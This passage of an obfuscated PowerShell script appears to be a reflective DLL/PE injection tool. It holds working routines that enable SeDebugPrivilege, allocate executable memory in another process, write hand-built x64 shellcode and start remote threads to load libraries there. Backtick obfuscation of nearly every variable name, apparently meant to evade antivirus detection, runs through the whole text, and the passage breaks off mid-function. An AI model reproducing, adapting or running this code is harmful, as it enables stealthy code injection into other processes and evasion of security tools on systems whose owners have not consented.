        )

        ${vAl`U`esI`Ze} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${v`A`LuE}.GetType()) * 2
        ${H`ex} = "0x{0:X$($ValueSize)}" -f [Int64]${Va`LUE} 

        return ${H`eX}
    }

    Function Test-MemoryRangeValid
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${t`RUE})]
        [String]
        ${Deb`Ug`st`RiNg},

        [Parameter(Position = 1, Mandatory = ${T`RUe})]
        [System.Object]
        ${PeI`NFo},

        [Parameter(Position = 2, Mandatory = ${TR`Ue})]
        [IntPtr]
        ${staRt`ADD`RESS},

        [Parameter(ParameterSetName = "Size", Position = 3, Mandatory = ${T`Rue})]
        [IntPtr]
        ${sI`ze}
        )

        [IntPtr]${f`i`NA`LeNdaddR`eSS} = [IntPtr](Add-SignedIntAsUnsigned (${sTart`A`DdR`ESS}) (${si`ZE}))

        ${P`e`ENdad`DRe`SS} = ${p`EiN`FO}.EndAddress

        if ((Compare-Val1GreaterThanVal2AsUInt (${p`eIn`Fo}.PEHandle) (${stArtA`d`DresS})) -eq ${tR`Ue})
        {
            Throw "Trying to write to memory smaller than allocated address range. $DebugString"
        }
        if ((Compare-Val1GreaterThanVal2AsUInt (${FinaL`ENDa`D`dRESS}) (${pEe`Nd`ADdR`ESS})) -eq ${tr`UE})
        {
            Throw "Trying to write to memory greater than allocated address range. $DebugString"
        }
    }

    Function Write-BytesToMemory
    {
        Param(
            [Parameter(Position=0, Mandatory = ${tR`UE})]
            [Byte[]]
            ${bY`T`es},

            [Parameter(Position=1, Mandatory = ${tr`UE})]
            [IntPtr]
            ${ME`mo`RYADDrESS}
        )

        for (${OfFs`et} = 0; ${o`Ff`SET} -lt ${B`Y`TEs}.Length; ${OF`Fs`ET}++)
        {
            [System.Runtime.InteropServices.Marshal]::WriteByte(${ME`Mory`ADDR`Ess}, ${off`S`Et}, ${B`Y`TeS}[${o`FfsET}])
        }
    }

    
    Function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]

            [Parameter( Position = 0)]
            [Type[]]
            ${p`A`R`AmETeRs} = (New-Object Type[](0)),

            [Parameter( Position = 1 )]
            [Type]
            ${rEt`Urnty`Pe} = [Void]
        )

        ${D`o`maIn} = [AppDomain]::CurrentDomain
        ${dyna`s`sem`BLY} = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        ${a`ss`EM`BlybUIl`Der} = ${dOM`Ain}.DefineDynamicAssembly(${DyN`A`SSEm`Bly}, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        ${modUl`ebuIld`ER} = ${a`sSE`mb`LybU`iLD`er}.DefineDynamicModule('InMemoryModule', ${fa`l`SE})
        ${t`y`peb`UIldEr} = ${mo`D`UlEb`U`ildeR}.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        ${COns`T`RUCt`ORBuilder} = ${Ty`pEbUi`Lder}.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, ${PArAme`TE`Rs})
        ${ConS`TR`UcT`ORb`UiL`DEr}.SetImplementationFlags('Runtime, Managed')
        ${MeTh`OdBu`ILd`er} = ${T`yPeBUI`LD`er}.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', ${R`EtUrNt`y`pe}, ${pA`Ra`m`ETErS})
        ${M`EtH`OdbUiLDER}.SetImplementationFlags('Runtime, Managed')

        Write-Output ${TYPEb`Uil`DER}.CreateType()
    }


    
    Function Get-ProcAddress
    {
        Param
        (
            [OutputType([IntPtr])]

            [Parameter( Position = 0, Mandatory = ${tR`Ue} )]
            [String]
            ${mo`d`ULE},

            [Parameter( Position = 1, Mandatory = ${TR`Ue} )]
            [String]
            ${procED`U`Re}
        )

        
        ${syStemAS`sEM`Bly} = [AppDomain]::CurrentDomain.GetAssemblies() |
            Where-Object { ${_}.GlobalAssemblyCache -And ${_}.Location.Split('\\')[-1].Equals('System.dll') }
        ${unsA`Fe`NaTiVemetho`DS} = ${S`ysTEmassE`m`BlY}.GetType('Microsoft.Win32.UnsafeNativeMethods')
        
        ${gEtm`OD`U`lEHandLe} = ${uNs`AfeNAti`V`eMEtHODs}.GetMethod('GetModuleHandle')
        ${g`eTpRO`CaDDrE`SS} = ${U`NSAfena`TIvEm`Ethods}.GetMethod('GetProcAddress', [reflection.bindingflags] "Public,Static", ${N`ULL}, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), ${n`Ull});
        
        ${kERN3`2`hAnDLE} = ${geTm`o`DUleHa`N`dLe}.Invoke(${NU`ll}, @(${M`O`DULE}))
        ${TM`PPtr} = New-Object IntPtr
        ${hA`N`dLerEF} = New-Object System.Runtime.InteropServices.HandleRef(${Tmp`PTR}, ${k`E`Rn`32`hAndLe})

        
        Write-Output ${G`et`P`ROCADd`RESs}.Invoke(${n`ULL}, @([System.Runtime.InteropServices.HandleRef]${ha`Nd`LeREF}, ${pR`ocED`URE}))
    }

    Function Enable-SeDebugPrivilege
    {
        Param(
        [Parameter(Position = 1, Mandatory = ${T`Rue})]
        [System.Object]
        ${w`In3`2functioNS},

        [Parameter(Position = 2, Mandatory = ${T`RUe})]
        [System.Object]
        ${WIN`3`2`TYpeS},

        [Parameter(Position = 3, Mandatory = ${T`RUE})]
        [System.Object]
        ${wI`N32cOn`S`Tan`TS}
        )

        [IntPtr]${tHR`E`ADH`ANdlE} = ${W`In32F`U`N`ctIoNs}.GetCurrentThread.Invoke()
        if (${THRe`ADHaNd`le} -eq [IntPtr]::Zero)
        {
            Throw "Unable to get the handle to the current thread"
        }

        [IntPtr]${Th`ReA`DTo`keN} = [IntPtr]::Zero
        [Bool]${re`SUlT} = ${Wi`N32fu`N`Ct`iOnS}.OpenThreadToken.Invoke(${t`H`R`EadhaND`le}, ${w`i`N32`C`oNStanTs}.TOKEN_QUERY -bor ${wi`N32c`oNsTaNTS}.TOKEN_ADJUST_PRIVILEGES, ${Fa`LSE}, [Ref]${ThreAD`T`OK`eN})
        if (${R`EsU`Lt} -eq ${F`ALse})
        {
            ${Er`ROR`cOde} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if (${erRo`RC`oDE} -eq ${WiN3`2CoN`StAN`Ts}.ERROR_NO_TOKEN)
            {
                ${r`EsulT} = ${Win3`2F`Un`Ct`ioNS}.ImpersonateSelf.Invoke(3)
                if (${R`esUlT} -eq ${F`A`Lse})
                {
                    Throw "Unable to impersonate self"
                }

                ${r`e`SULT} = ${wiN32f`Un`CT`IOns}.OpenThreadToken.Invoke(${TH`READ`HANDlE}, ${w`i`N3`2c`oNStants}.TOKEN_QUERY -bor ${Win`32ConST`A`Nts}.TOKEN_ADJUST_PRIVILEGES, ${faL`Se}, [Ref]${tHr`e`ADTo`keN})
                if (${rE`su`lt} -eq ${f`A`lse})
                {
                    Throw "Unable to OpenThreadToken."
                }
            }
            else
            {
                Throw "Unable to OpenThreadToken. Error code: $ErrorCode"
            }
        }

        [IntPtr]${PL`UiD} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${WiN3`2t`ypES}.LUID))
        ${R`E`SULT} = ${WIn32F`U`NCT`ions}.LookupPrivilegeValue.Invoke(${N`ULl}, "SeDebugPrivilege", ${PLu`Id})
        if (${re`Sult} -eq ${fAl`sE})
        {
            Throw "Unable to call LookupPrivilegeValue"
        }

        [UInt32]${ToKe`N`prIv`siZe} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]${WIN32`TY`peS}.TOKEN_PRIVILEGES)
        [IntPtr]${Tok`E`NPRIvI`Le`GEsm`Em} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${toke`N`Pr`iVsize})
        ${TOKe`NPRI`VilEgeS} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${tOk`E`NPR`i`VILegESmeM}, [Type]${WiN`3`2T`yPEs}.TOKEN_PRIVILEGES)
        ${t`Oke`NprivILe`GES}.PrivilegeCount = 1
        ${t`Ok`EnP`RivilE`geS}.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${PL`U`Id}, [Type]${w`IN32t`YPeS}.LUID)
        ${ToK`Enp`RIv`iLEgeS}.Privileges.Attributes = ${WiN3`2C`on`STA`NTS}.SE_PRIVILEGE_ENABLED
        [System.Runtime.InteropServices.Marshal]::StructureToPtr(${t`Oke`NPriVi`LegEs}, ${T`o`Ken`priVILEgE`SM`eM}, ${T`RUE})

        ${re`sulT} = ${WI`N32fuNCTiO`NS}.AdjustTokenPrivileges.Invoke(${tH`REa`D`TOKen}, ${Fal`SE}, ${to`keNpRivI`LeG`e`S`meM}, ${T`OKEnpRiV`s`Ize}, [IntPtr]::Zero, [IntPtr]::Zero)
        ${eR`RORc`OdE} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() 
        if ((${RE`SulT} -eq ${fAL`SE}) -or (${eR`R`oR`coDe} -ne 0))
        {
            
        }

        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${TOK`e`NpRivILeGesm`eM})
    }

    Function Create-RemoteThread
    {
        Param(
        [Parameter(Position = 1, Mandatory = ${tR`Ue})]
        [IntPtr]
        ${P`RoCEs`sHAND`lE},

        [Parameter(Position = 2, Mandatory = ${T`RuE})]
        [IntPtr]
        ${stAR`TAD`D`R`ESS},

        [Parameter(Position = 3, Mandatory = ${F`AlSe})]
        [IntPtr]
        ${aR`GuM`e`NtPTr} = [IntPtr]::Zero,

        [Parameter(Position = 4, Mandatory = ${Tr`UE})]
        [System.Object]
        ${win`3`2f`Unct`ions}
        )

        [IntPtr]${ReM`oTeth`REaDHAnD`le} = [IntPtr]::Zero

        ${O`sve`R`SIOn} = [Environment]::OSVersion.Version
        
        if ((${o`SV`eRs`IOn} -ge (New-Object 'Version' 6,0)) -and (${o`SVer`SiON} -lt (New-Object 'Version' 6,2)))
        {
            
            ${rE`TvaL}= ${WIn32f`U`NctI`ONs}.NtCreateThreadEx.Invoke([Ref]${re`MoTE`Thr`EADH`AN`dLe}, 0x1FFFFF, [IntPtr]::Zero, ${P`Roc`esshaNdlE}, ${stA`R`TadDR`EsS}, ${argu`MEnTP`Tr}, ${fAL`sE}, 0, 0xffff, 0xffff, [IntPtr]::Zero)
            ${L`A`ST`ErRoR} = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
            if (${R`EmOT`eTHRE`A`dh`ANDlE} -eq [IntPtr]::Zero)
            {
                Throw "Error in NtCreateThreadEx. Return value: $RetVal. LastError: $LastError"
            }
        }
        
        else
        {
            
            ${remoT`e`TH`R`EadhaNDLe} = ${wiN`3`2`FUnC`TIONS}.CreateRemoteThread.Invoke(${pROC`e`Ssha`NdlE}, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, ${sTA`R`TADD`ReSS}, ${a`RGUME`NtPTr}, 0, [IntPtr]::Zero)
        }

        if (${Rem`o`TeThR`EaDhA`ND`Le} -eq [IntPtr]::Zero)
        {
            Write-Error "Error creating remote thread, thread handle is null" -ErrorAction Stop
        }

        return ${r`EMO`TeTHreAdh`A`N`DLe}
    }

    Function Get-ImageNtHeaders
    {
        Param(
        [Parameter(Position = 0, Mandatory = ${T`RUE})]
        [IntPtr]
        ${P`eHA`NdlE},

        [Parameter(Position = 1, Mandatory = ${TR`UE})]
        [System.Object]
        ${w`iN32`TY`pEs}
        )

        ${NthE`Ad`ErSInfo} = New-Object System.Object

        
        ${D`os`he`ADEr} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${p`ehaNd`LE}, [Type]${WIN32ty`p`Es}.IMAGE_DOS_HEADER)

        
        [IntPtr]${N`Thea`dErSp`Tr} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${Peh`ANd`Le}) ([Int64][UInt64]${dO`S`hEAD`Er}.e_lfanew))
        ${NTh`EaDer`Si`Nfo} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ${Nthe`A`dEr`spTr}
        ${i`MagEn`T`h`eADeRS64} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${NtH`eADE`RS`ptr}, [Type]${WI`N32`TypES}.IMAGE_NT_HEADERS64)

        
        if (${im`AGE`N`THeA`ders`64}.Signature -ne 0x00004550)
        {
            throw "Invalid IMAGE_NT_HEADER signature."
        }

        if (${iM`Ag`enT`he`AdErs64}.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
        {
            ${NThE`ADERS`I`N`Fo} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${iMaG`eNTHE`ADer`S64}
            ${NTHEade`R`SI`Nfo} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ${TR`Ue}
        }
        else
        {
            ${I`mAgEnThE`AdERs`32} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${ntH`EADer`spTr}, [Type]${w`in`32TypeS}.IMAGE_NT_HEADERS32)
            ${n`THE`AderSinfO} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ${Ima`geNT`He`AD`eRS32}
            ${N`TH`eAdersin`FO} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ${Fa`LSe}
        }

        return ${nthe`ADe`R`sinFO}
    }


    
    Function Get-PEBasicInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = ${Tr`UE} )]
        [Byte[]]
        ${P`Eb`ytES},

        [Parameter(Position = 1, Mandatory = ${tr`Ue})]
        [System.Object]
        ${w`in32ty`P`es}
        )

        ${pe`in`Fo} = New-Object System.Object

        
        [IntPtr]${U`Nma`NAG`EDPE`BYtES} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${p`EbytEs}.Length)
        [System.Runtime.InteropServices.Marshal]::Copy(${p`e`ByTes}, 0, ${uNm`AnAGe`dpeBYT`eS}, ${p`eb`ytEs}.Length) | Out-Null

        
        ${ntheadERSI`N`FO} = Get-ImageNtHeaders -PEHandle ${u`NMAna`GEdPE`ByTES} -Win32Types ${w`iN3`2t`Ypes}

        
        ${P`Ei`NfO} | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value (${nt`heAdE`RSI`N`FO}.PE64Bit)
        ${p`Ei`Nfo} | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value (${NTH`e`AD`ErSINfO}.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
        ${pe`iN`FO} | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value (${NTHEAd`E`RS`info}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        ${PE`In`Fo} | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value (${n`ThEAd`eRsI`N`Fo}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
        ${Pei`Nfo} | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value (${n`TH`EAdeRs`iNFO}.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)

        
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal(${U`NMa`NAGED`peby`Tes})

        return ${P`eInfO}
    }


    
    
    Function Get-PEDetailedInfo
    {
        Param(
        [Parameter( Position = 0, Mandatory = ${tr`UE})]
        [IntPtr]
        ${pEhAn`dLe},

        [Parameter(Position = 1, Mandatory = ${t`RuE})]
        [System.Object]
        ${win32`TY`P`eS},

        [Parameter(Position = 2, Mandatory = ${tr`UE})]
        [System.Object]
        ${win32CO`NST`A`N`TS}
        )

        if (${PEH`AnDlE} -eq ${nU`ll} -or ${pe`hA`NdlE} -eq [IntPtr]::Zero)
        {
            throw 'PEHandle is null or IntPtr.Zero'
        }

        ${pe`I`NFO} = New-Object System.Object

        
        ${NT`HEADe`RsI`NFO} = Get-ImageNtHeaders -PEHandle ${P`E`HanDLE} -Win32Types ${wi`N`32tYpeS}

        
        ${Pe`In`Fo} | Add-Member -MemberType NoteProperty -Name PEHandle -Value ${pe`hAn`dle}
        ${P`ei`NFo} | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value (${nt`hE`AdeR`sin`FO}.IMAGE_NT_HEADERS)
        ${peI`NFo} | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value (${NThea`d`ERsinfo}.NtHeadersPtr)
        ${PeI`N`Fo} | Add-Member -MemberType NoteProperty -Name PE64Bit -Value (${nTHea`Der`S`INfo}.PE64Bit)
        ${P`EiNFo} | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value (${n`TH`EaderS`iN`Fo}.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)

        if (${p`eIN`FO}.PE64Bit -eq ${t`Rue})
        {
            [IntPtr]${S`ec`Tio`NhE`ADerpTR} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${P`E`InFO}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${wI`N32`T`ypeS}.IMAGE_NT_HEADERS64)))
            ${p`eINFo} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${SE`Cti`o`NhEaDErP`Tr}
        }
        else
        {
            [IntPtr]${SECtIo`Nh`EAdE`R`pTr} = [IntPtr](Add-SignedIntAsUnsigned ([Int64]${p`e`info}.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]${wI`N32ty`Pes}.IMAGE_NT_HEADERS32)))
            ${p`eIn`FO} | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value ${Sectio`N`HEaD`E`Rp`Tr}
        }

        if ((${nTH`eaD`ERsiN`FO}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${w`In32CoN`sT`A`Nts}.IMAGE_FILE_DLL) -eq ${wiN32`CONS`Ta`NTS}.IMAGE_FILE_DLL)
        {
            ${pEI`N`FO} | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif ((${nT`h`EaderSI`NFO}.IMAGE_NT_HEADERS.FileHeader.Characteristics -band ${wIN`32c`ons`TaNtS}.IMAGE_FILE_EXECUTABLE_IMAGE) -eq ${WIN32C`ON`s`TaNTS}.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            ${P`EinFO} | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }

        return ${p`eiNFo}
    }

    Function Import-DllInRemoteProcess
    {
        Param(
        [Parameter(Position=0, Mandatory=${T`RUE})]
        [IntPtr]
        ${RE`moTePrO`Cha`NdLE},

        [Parameter(Position=1, Mandatory=${Tr`Ue})]
        [IntPtr]
        ${imPOR`T`d`lLPA`ThPTr}
        )

        ${PT`RsIze} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        ${I`m`PO`RtDLLPAtH} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${im`poRtDlL`pAth`Ptr})
        ${dLL`P`ATH`Size} = [UIntPtr][UInt64]([UInt64]${I`M`p`oRtd`llpAtH}.Length + 1)
        ${Ri`MPo`RtD`LLPAThptR} = ${wIn`32fun`cTIo`Ns}.VirtualAllocEx.Invoke(${rEmoTE`PrOC`haNd`le}, [IntPtr]::Zero, ${dLL`P`At`hsIze}, ${wiN32C`ONST`A`NtS}.MEM_COMMIT -bor ${wI`N32`cOnSta`N`TS}.MEM_RESERVE, ${W`IN32CoNST`AN`Ts}.PAGE_READWRITE)
        if (${R`I`mpoRtdL`LP`ATHptR} -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }

        [UIntPtr]${NU`m`BYtEsWrI`TtEn} = [UIntPtr]::Zero
        ${suc`cE`Ss} = ${WIn32fun`CT`i`oNS}.WriteProcessMemory.Invoke(${remoTE`pRo`cHA`ND`LE}, ${RiMpoR`T`DlLp`ATHP`Tr}, ${IMP`O`RTD`l`lpAthp`TR}, ${dl`lpA`Thsi`ZE}, [Ref]${N`Um`BYtesW`RiT`TeN})

        if (${su`cc`EsS} -eq ${fa`L`sE})
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if (${dLL`pat`Hs`iZE} -ne ${NumB`YtEswR`ITTEn})
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }

        ${kERnEL`3`2Ha`NdLE} = ${Win3`2f`UNC`TiOns}.GetModuleHandle.Invoke("kernel32.dll")
        ${LOAdLiBra`R`y`AADDr} = ${wiN3`2`FUnCTIO`Ns}.GetProcAddress.Invoke(${kErn`EL32hAn`d`LE}, "LoadLibraryA") 

        [IntPtr]${d`l`LADdRess} = [IntPtr]::Zero
        
        
        if (${Pei`NFo}.PE64Bit -eq ${t`RUe})
        {
            
            ${LoaDlI`BrA`Ry`A`Ret`mem} = ${WIN32FU`N`CtIO`Ns}.VirtualAllocEx.Invoke(${R`E`MO`TEprOChaNdLE}, [IntPtr]::Zero, ${dL`lpAThsi`ze}, ${win32c`On`s`TaNts}.MEM_COMMIT -bor ${w`i`N`32C`oNsTants}.MEM_RESERVE, ${w`i`N32co`NStAnTs}.PAGE_READWRITE)
            if (${LOADl`IB`RArYaRe`Tm`EM} -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }

            
            ${lOaDlib`Ra`R`YSC1} = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            ${LoaD`LibrA`R`ysC2} = @(0x48, 0xba)
            ${load`lI`BRAryS`c3} = @(0xff, 0xd2, 0x48, 0xba)
            ${LOAdlibr`AR`Ysc4} = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)

            ${sc`le`NGth} = ${loA`dLIB`RArY`sC1}.Length + ${LOadlI`BRar`Ysc2}.Length + ${LoAd`Lib`RARys`C3}.Length + ${L`oAdlI`BrarY`sc4}.Length + (${PTR`Size} * 3)
            ${s`cPsm`EM} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${Scl`ENgTh})
            ${sCpSM`EMo`R`IginAL} = ${SCp`sMem}

            Write-BytesToMemory -Bytes ${Lo`ADLiBrarY`Sc1} -MemoryAddress ${s`C`PSMeM}
            ${sC`P`sMEm} = Add-SignedIntAsUnsigned ${ScPs`m`eM} (${lOad`LIb`Ra`Rysc1}.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${RimPORtD`l`Lpa`ThPTr}, ${sc`psmEm}, ${F`AL`se})
            ${S`CPsm`Em} = Add-SignedIntAsUnsigned ${Sc`Ps`mEm} (${Pt`RS`Ize})
            Write-BytesToMemory -Bytes ${L`o`AdlIb`RARY`sc2} -MemoryAddress ${scpsM`em}
            ${s`CP`sMEm} = Add-SignedIntAsUnsigned ${sc`PSm`em} (${loAd`LI`B`RarySC2}.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${lOA`DLiBRAR`y`AA`DDr}, ${s`c`pSMem}, ${f`AlSe})
            ${sc`Ps`MEM} = Add-SignedIntAsUnsigned ${sCP`S`MEm} (${Ptrs`i`ze})
            Write-BytesToMemory -Bytes ${lO`ADLibR`AR`ySC3} -MemoryAddress ${s`Cp`smem}
            ${s`CP`sMEM} = Add-SignedIntAsUnsigned ${sCpSM`em} (${LOA`dl`IB`RaRy`sc3}.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr(${LOaDlIb`RA`RYaRe`Tmem}, ${sC`Ps`meM}, ${F`AL`se})
            ${sc`P`sMem} = Add-SignedIntAsUnsigned ${s`cPsmeM} (${p`TRS`ize})
            Write-BytesToMemory -Bytes ${loadLi`BR`A`R`YSc4} -MemoryAddress ${S`CP`sMEm}
            ${SCP`SM`eM} = Add-SignedIntAsUnsigned ${Scps`M`EM} (${l`O`A`dLiBra`RysC4}.Length)

            ${R`SCad`dR} = ${WIn`32FUNct`I`Ons}.VirtualAllocEx.Invoke(${reMoT`e`P`ROchA`ND`LE}, [IntPtr]::Zero, [UIntPtr][UInt64]${sclEN`g`Th}, ${W`iN3`2co`N`STantS}.MEM_COMMIT -bor ${wIn3`2C`o`NstAN`Ts}.MEM_RESERVE, ${w`in32C`oNs`T`ANTS}.PAGE_EXECUTE_READWRITE)
            if (${R`Sca`dDR} -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }

            ${SUC`c`Ess} = ${w`I`N32F`Unc`TIoNS}.WriteProcessMemory.Invoke(${rEm`otEP`ROC`HAndlE}, ${R`S`CADdR}, ${s`CPSm`EMORIginAl}, [UIntPtr][UInt64]${S`cLEnG`Th}, [Ref]${Numbyt`ESW`RIttEN})
            if ((${SU`cc`esS} -eq ${FA`lSE}) -or ([UInt64]${N`UM`B`YTE`Sw`RITteN} -ne [UInt64]${scLeN`gTh}))
            {
                Throw "Unable to write shellcode to remote process memory."
            }

            ${R`T`H`ReAD`hANDle} = Create-RemoteThread -ProcessHandle ${rEmoT`epRoC`h`ANdle} -StartAddress ${R`ScadDr} -Win32Functions ${w`in3`2Func`TionS}
            ${r`eSulT} = ${WIN3`2FUN`C`TiOnS}.WaitForSingleObject.Invoke(${R`ThReAd`hAn`d`le}, 20000)
            if (${reS`UlT} -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            
            [IntPtr]${re`TuR`N`Val`mem} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${pt`R`SizE})
            ${ReSU`LT} = ${WIN`32`FunCtI`oNS}.ReadProcessMemory.Invoke(${ReMOTE`pROcHAn`d`le}, ${LOadLiBra`R`Y`ArE`T`MEm}, ${r`eTurnVAL`meM}, [UIntPtr][UInt64]${P`T`RsIZe}, [Ref]${n`UM`Byt`eswrI`TTEN})
            if (${R`EsULT} -eq ${FaL`sE})
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]${DLlaDd`R`eSs} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${r`ET`U`RNvAlmEM}, [Type][IntPtr])

            ${win32fUNC`T`IoNs}.VirtualFreeEx.Invoke(${RE`MOTEpR`OChaN`Dle}, ${loadL`iBraR`yAr`ETm`em}, [UIntPtr][UInt64]0, ${WIN32c`OnST`A`NTS}.MEM_RELEASE) | Out-Null
            ${wIN3`2fU`NCTI`O`NS}.VirtualFreeEx.Invoke(${reMOt`E`PR`o`ch`ANdle}, ${r`Sc`AdDR}, [UIntPtr][UInt64]0, ${WIn32`CO`Nstan`Ts}.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]${rt`Hr`EA`dHAnDle} = Create-RemoteThread -ProcessHandle ${RE`MOTepr`OChA`N`dle} -StartAddress ${l`O`ADliBRARY`AaDDr} -ArgumentPtr ${rIMporTd`l`lpatH`P`Tr} -Win32Functions ${wiN32fU`Nc`Tio`Ns}
            ${rE`SUlt} = ${win`32FUNC`T`I`OnS}.WaitForSingleObject.Invoke(${RTh`ReA`d`HaN`DLE}, 20000)
            if (${rEsu`lT} -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }

            [Int32]${EXit`c`OdE} = 0
            ${r`E`sULt} = ${wIn`32fu`NCti`OnS}.GetExitCodeThread.Invoke(${r`THReaDH`A`NDlE}, [Ref]${eXi`TC`Ode})
            if ((${r`E`suLt} -eq 0) -or (${ex`ITC`oDE} -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }

            [IntPtr]${DLLA`Dd`RE`ss} = [IntPtr]${E`XiT`C`odE}
        }

        ${wIN`32F`U`NctiONS}.VirtualFreeEx.Invoke(${rEMoT`E`procHAn`d`LE}, ${RI`mpORtD`llPAth`P`Tr}, [UIntPtr][UInt64]0, ${win32C`ON`Stan`TS}.MEM_RELEASE) | Out-Null

        return ${dL`Lad`drESs}
    }

    Function Get-RemoteProcAddress
    {
        Param(
        [Parameter(Position=0, Mandatory=${T`RuE})]
        [IntPtr]
        ${REMoTEp`RoCH`An`dLe},

        [Parameter(Position=1, Mandatory=${tr`Ue})]
        [IntPtr]
        ${r`eM`OtEDlL`Han`DLe},

        [Parameter(Position=2, Mandatory=${T`RuE})]
        [IntPtr]
        ${fUNC`Tion`N`AmePTR},

        [Parameter(Position=3, Mandatory=${tR`UE})]
        [Bool]
        ${load`ByorDi`NAL}
        )

        ${pTR`siZE} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        [IntPtr]${rFu`NC`N`AMEptr} = [IntPtr]::Zero   
        
        if (-not ${LoA`dB`yO`RdiNAl})
        {
            ${f`U`Nc`T`ionnamE} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${f`UnCTI`ONNA`mePTr})

            
            ${fUN`C`TIoNn`AmE`siZE} = [UIntPtr][UInt64]([UInt64]${fUNcT`i`onnAmE}.Length + 1)
            ${rf`UNCNAmeP`TR} = ${wIn`3`2fuNc`TIons}.VirtualAllocEx.Invoke(${rEMoT`E`PrOcHaND`Le}, [IntPtr]::Zero, ${FuN`C`TioNn`A`meSIZE}, ${Wi`N32c`O`NsT`ANtS}.MEM_COMMIT -bor ${wi`N32`c`o`NSTANTS}.MEM_RESERVE, ${wi`N3`2CO`NSTants}.PAGE_READWRITE)
            if (${rFUnCN`Amep`Tr} -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process"
            }

            [UIntPtr]${n`UMB`YTeSWR`itt`En} = [UIntPtr]::Zero
            ${sUC`cE`SS} = ${WI`N32fu`NctIo`Ns}.WriteProcessMemory.Invoke(${rEMoTE`PRoC`H`ANd`Le}, ${RFu`NcNaM`E`P`Tr}, ${functi`ONNaM`eP`Tr}, ${fu`NC`TiONn`AmES`iZe}, [Ref]${num`BYtE`s`wRiTteN})
            if (${SucCE`sS} -eq ${f`AL`SE})
            {
